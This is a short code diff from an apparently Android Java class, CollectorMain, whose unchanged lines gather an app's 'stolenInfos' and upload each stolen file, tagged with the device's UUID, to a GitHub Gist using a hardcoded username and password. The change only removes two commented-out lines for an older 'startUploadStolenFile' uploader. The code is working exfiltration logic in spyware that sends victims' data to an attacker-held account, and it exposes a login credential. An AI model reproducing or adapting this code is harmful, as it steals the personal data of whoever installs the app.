@@ -35,7 +35,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public void run() {
 		// TODO: Implement this method
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
-		//FileUploader fu=new FileUploader(TheApplication.instance.uuid);
 		GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything","nao2001nao");
 		Gist gst=null;
 		String s="";
@@ -59,7 +58,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		for (String filename:files) {
 			System.out.println("upload:"+filename);
 			try {
-				//copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
 				GistFile gf=new GistFile().setContent(sb.getString(filename,"")).setFilename(TheApplication.instance.uuid+"_"+filename);
 				datas.put(TheApplication.instance.uuid+"/files/"+filename,gf);
 			} catch (Throwable e) {
